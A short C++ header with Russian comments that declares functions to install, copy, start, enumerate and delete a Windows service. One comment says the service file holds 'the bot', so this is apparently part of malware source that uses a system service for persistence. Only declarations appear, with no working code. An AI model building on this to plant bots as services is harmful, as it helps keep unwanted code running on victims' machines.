#pragma once

#include "core\core.h"
#include "core\service.h"

namespace Service
{
	//устанавливает сервис в систему, если copyFile = flase, то файл srcFile не копируется в нужное место (было уже скопировано)
	bool Install( const StringBuilder& srcFile, bool copyFile = true ); 
	//копирует файл в в файл сервиса
	bool Copy( const StringBuilder& srcFile );
//	bool Copy( const Mem::Data& data );
	bool Start(); //запускает установленный сервис
	bool IsService( const StringBuilder& fileName ); //является ли указанный файл файлом сервиса
	//возвращает список сервисов, возвращаему память нужно самому удалить
	LPENUM_SERVICE_STATUS_PROCESS GetListServices( int& countServices );
	//удаляет указанный сервис, в том числе и файл, если указано
	bool DeleteWithFile( const StringBuilder& name, bool delFile = true );
	//имя файла под которым хранится бот для запуска сервисом
	bool GetFileNameService( StringBuilder& fileName );
}
